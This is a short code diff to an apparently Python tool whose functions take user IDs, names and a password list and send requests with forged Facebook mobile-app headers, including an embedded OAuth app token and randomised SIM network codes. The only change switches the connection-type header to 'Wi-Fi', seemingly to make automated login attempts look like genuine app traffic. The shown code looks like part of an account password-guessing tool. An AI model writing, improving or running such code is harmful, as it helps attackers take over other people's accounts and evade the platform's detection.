@@ -442,7 +442,7 @@ def api(ids,names,passlist):
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
                                         'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-type':'unknown',
+                                        'x-fb-connection-type':'Wi-Fi',
                                         'Authorization':'OAuth 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',
                                         'user-agent':ua_string,
                                         'x-fb-net-hni':str(random.randint(2e4,4e4)),
@@ -513,7 +513,7 @@ def api1(ids,names,passlist):
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
                                         'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-type':'unknown',
+                                        'x-fb-connection-type':'Wi-Fi',
                                         'Authorization':'OAuth 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',
                                         'user-agent':ua_string,
                                         'x-fb-net-hni':str(random.randint(2e4,4e4)),
